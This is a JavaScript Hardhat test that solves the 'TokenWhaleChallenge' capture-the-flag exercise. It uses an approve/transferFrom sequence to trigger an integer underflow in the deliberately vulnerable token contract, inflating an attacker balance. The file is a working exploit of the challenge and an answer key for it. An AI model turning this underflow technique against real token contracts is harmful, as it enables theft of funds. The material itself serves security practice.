const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");
const assert = require('node:assert').strict;

it("Solves TokenWhaleChallenge", async function () {
  const [, attacker0, attacker1] = await ethers.getSigners();
  const fixture = () => fixtureFactory("TokenWhaleChallenge", 0, attacker0);
  const contract = await loadFixture(fixture);

  const contractConnectedToAttacker0 = contract.connect(attacker0);
  const contractConnectedToAttacker1 = contract.connect(attacker1);

  const address0 = await attacker0.getAddress();
  const address1 = await attacker1.getAddress();
  
  await contractConnectedToAttacker0.approve(address1, 1000);
  await contractConnectedToAttacker1.transferFrom(address0, address0, 1);
  await contractConnectedToAttacker1.transfer(address0, 1000000);

  expect(await contract.isComplete()).to.equal(true);
});
